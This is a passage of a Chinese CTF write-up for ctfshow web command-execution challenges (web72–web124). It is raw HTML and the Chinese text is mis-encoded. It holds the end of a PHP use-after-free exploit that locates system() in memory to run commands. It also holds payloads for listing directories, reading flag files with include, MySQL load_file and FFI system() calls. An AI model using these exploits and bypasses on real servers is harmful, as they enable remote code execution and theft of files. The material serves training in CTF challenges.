number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>        <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>            <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$vuln</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></code></pre><h4 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h4><p>é¦–å…ˆæŸ¥æ‰¾flagä½ç½®,ç„¶åä½¿ç”¨æ–‡ä»¶åŒ…å«å¾—åˆ°flag</p><p>Payload:</p><blockquote><p>1ã€c&#x3D;var_export(scandir(â€˜&#x2F;â€˜));exit(0);c&#x3D;require_once(â€˜&#x2F;flagc.txtâ€™);exit(0);</p><p>2ã€c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob://./*");foreach($a as $f){   echo($f->__toString().' ');}exit(0);?></p><p>c&#x3D;include(â€˜flagc.txtâ€™);exit(0);</p></blockquote><h4 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h4><p>scandirå‡½æ•°è¢«banäº†ï¼Œä½¿ç”¨DirectoryIteratorç±»ï¼Œflagåœ¨&#x2F;flagx.txt</p><p>æˆ–è€…ä½¿ç”¨globåè®®</p><p>Payload:</p><blockquote><p>c&#x3D;var_export(glob(â€˜..&#x2F;..&#x2F;..â€™.â€™&#x2F;*â€™));exit(0);</p></blockquote><h4 id="web75-Sql-load-file"><a href="#web75-Sql-load-file" class="headerlink" title="web75(Sql load_file)"></a>web75(Sql load_file)</h4><p>å¯ä»¥æŸ¥åˆ°flagä½ç½®ï¼š&#x2F;flag36.txt  ä½†æ˜¯includeè¢«banäº†ï¼Œä¹‹å‰çš„pocå› ä¸ºstrlenè¢«ç¦äº†è·å–ä¸åˆ°systemåœ°å€ä¹Ÿæ²¡æ³•ç”¨äº†</p><p>å¯ä»¥ä½¿ç”¨mysqlçš„load_fileå‡½æ•°</p><p>å…ˆæŸ¥è¯¢æ•°æ®åº“</p><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql:host=localhost;dbname=information_schema"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select database()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">## $rs = $db->query("select group_concat(SCHEMA_NAME) from SCHEMATA");</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$rs</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æŸ¥åˆ°äº†ctftrainingçš„æ•°æ®åº“ï¼Œç„¶åä½¿ç”¨load_fileè¯»å–flag</p><blockquote><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><h4 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h4><p>PayloadåŒä¸Š</p><h4 id="web77-FFI-php7-4ä»¥ä¸Š"><a href="#web77-FFI-php7-4ä»¥ä¸Š" class="headerlink" title="web77(FFI php7.4ä»¥ä¸Š)"></a>web77(FFI php7.4ä»¥ä¸Š)</h4><p>FFIï¼Œphp7.4ä»¥ä¸Šæ‰æœ‰</p><p>Payload:</p><blockquote><p>$ffi &#x3D; FFI::cdef(â€œint system(const char *command);â€);&#x2F;&#x2F;åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡<br>$a&#x3D;â€™&#x2F;readflag &gt; 1.txtâ€™;   &#x2F;&#x2F;æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦é‡å®šå‘åˆ°æ–‡ä»¶<br>$ffi-&gt;system($a);       &#x2F;&#x2F;é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°</p></blockquote><h4 id="web118-Bashå†…ç½®å˜é‡"><a href="#web118-Bashå†…ç½®å˜é‡" class="headerlink" title="web118(Bashå†…ç½®å˜é‡)"></a>web118(Bashå†…ç½®å˜é‡)</h4><p><img src="web118_3.png" loading="lazy"></p><h4 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h4><p><img src="web119_3.png" loading="lazy"></p><h4 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h4><p><img src="web120.png" loading="lazy"></p><h4 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h4><p><img src="web121.png" loading="lazy"></p><h4 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h4><p><img src="web122.png" loading="lazy"></p><h4 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h4><p>2019CISCNåˆèµ›åŸé¢˜</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"> &lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: æ”¶é›†è‡ªç½‘ç»œ# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-06 14:04:45*&#x2F;error_reporting(0);&#x2F;&#x2F;å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;ä¾‹å­ c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;);    &#125;    $blacklist 